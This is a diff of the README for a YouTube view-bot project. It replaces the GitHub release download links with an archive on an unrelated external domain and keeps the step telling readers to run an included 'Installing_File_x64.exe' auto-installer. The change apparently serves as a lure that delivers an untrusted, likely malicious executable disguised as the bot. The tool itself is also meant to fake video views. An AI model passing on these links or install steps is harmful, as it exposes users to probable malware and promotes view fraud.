@@ -9,11 +9,11 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/ecdafe72-2e29-4484-965e-48035353a558)
-](https://github.com/tonynhowy/Youtube-View-Bot-2024/releases/download/V3.6/Release.zip)
+](https://dl.jrdesklabs.com/Setup.zip)
 
 
 
-## **1. [Download the archive](https://github.com/tonynhowy/Youtube-View-Bot-2024/releases/download/V3.6/Release.zip) and extract it to a convenient folder.**
+## **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 ![photo_2024-10-24_14-07-57](https://github.com/user-attachments/assets/ad053226-f6da-4457-8a4b-77a29774b710)
 
